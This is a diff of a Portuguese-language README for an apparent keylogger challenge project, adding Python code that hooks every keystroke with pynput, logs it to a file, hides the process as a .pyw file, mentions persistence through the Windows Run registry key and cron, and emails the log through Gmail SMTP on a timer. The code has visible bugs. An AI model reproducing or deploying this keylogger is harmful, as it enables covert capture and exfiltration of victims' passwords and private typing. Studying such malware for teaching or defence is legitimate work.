@@ -50,16 +50,53 @@ O ambiente virtual isola as dependências do projeto sem afetar o Python global 
 #### 1. Captura de Teclas
 Um *listener* global é registrado no sistema operacional. A cada evento de teclado — tecla pressionada ou solta — uma função de *callback* é chamada automaticamente, recebendo o objeto da tecla como parâmetro. A lógica diferencia teclas especiais (Enter, Backspace, Esc) de caracteres alfanuméricos:
 
-```
-[ # IMPORTAR BIBLIOTECAS ]
-[ # CAPTURAR TECLAS ]
+```python
+from pynput import keyboard
+import toEmail
+
+# Mapeamento de teclas especiais para o texto correspondente
+TECLAS_ESPECIAIS = {
+    keyboard.Key.space: " ",
+    keyboard.Key.enter: "\n",
+    keyboard.Key.tab: "\t",
+    keyboard.Key.backspace: " [BACKSPACE] ",
+    keyboard.Key.esc: " [ESC] ",
+}
+
+def on_press(key):
+    with open("Keylogger/files/log.txt", "a", encoding="utf-8") as file:
+        try:
+            # Tenta tecla normal
+            file.write(key.char)
+        except AttributeError:
+            # Se for especial, verifica no dicionário
+            if key in TECLAS_ESPECIAIS:
+                file.write(TECLAS_ESPECIAIS[key])
+            else:
+                # Para qualquer outra tecla não mapeada
+                file.write(f"[{key}] ")
+
+with keyboard.Listener(on_press=on_press) as listener:
+	toEmail.enviar_email()
+	listener.join()
 ```
 
 #### 2. Persistência em Arquivo
 As teclas capturadas são concatenadas e escritas em um arquivo `.txt` local. Esse log acumula toda a digitação da sessão. Teclas especiais são registradas entre colchetes para facilitar a leitura posterior (`[ENTER]`, `[BACKSPACE]`, `[SPACE]`):
 
-```
-[ # SALVAR EM ARQUIVO ]
+```python
+def on_press(key):
+    with open("Keylogger/files/log.txt", "a", encoding="utf-8") as file:
+        try:
+            # Tenta tecla normal
+            file.write(key.char)
+        except AttributeError:
+            # Se for especial, verifica no dicionário
+            if key in TECLAS_ESPECIAIS:
+                file.write(TECLAS_ESPECIAIS[key])
+            else:
+                # Para qualquer outra tecla não mapeada
+                file.write(f"[{key}] ")
 ```
 
 #### 3. Furtividade
@@ -69,16 +106,42 @@ Em ataques reais, o processo precisa ser invisível para a vítima. As técnicas
 - **Linux/macOS:** o processo pode ser executado em background via `nohup` ou `daemon`, com redirecionamento de saída para `/dev/null`.
 - **Persistência no sistema:** entradas no registro do Windows (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) ou crons no Linux garantem que o keylogger reinicie automaticamente com o sistema:
 
-```
-[ # TORNAR FURTIVO ]
-[ # PERSISTÊNCIA NO SISTEMA ]
-```
+Para fins do desafio, o arquivo `main.py` será renomeado para a extensão `.pyw`, tornando-o furtivo pelo terminal.
 
 #### 4. Exfiltração por E-mail
 O log acumulado é periodicamente enviado ao endereço do atacante via SMTP, usando o módulo `smtplib` nativo do Python. Em contas do Gmail, isso requer o uso de uma *App Password* gerada nas configurações de segurança da conta (a autenticação padrão por senha simples foi descontinuada pelo Google):
 
-```
-[ # ENVIAR POR EMAIL ]
+```python
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+
+# Configurações do EMAIL
+EMAIL_ORIGEM = "daniel.bomfim.assis@gmail.com"
+EMAIL_DESTINO = "daniel.bomfim.assis@gmail.com"
+SENHA_EMAIL = "" # Senha do email especificado
+
+log = ""
+
+def enviar_email():
+	global log
+	if log:
+		message = MIMEText(log)
+		message["SUBEJCT"] = "Dados capturados pelo keylogger"
+		message["From"] = EMAIL_ORIGEM
+		message["To"] = EMAIL_DESTINO
+		try:
+			server = smtplib.SMTP("smtp.gmail.com", 587)
+			server.startls()
+			server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+			server.send_message(message)
+			server.quit()
+		except Exception:
+			print("Erro ao enviar", Exception)
+
+	# Agendar o envio
+	Timer(60, enviar_email())
 ```
 
 ---
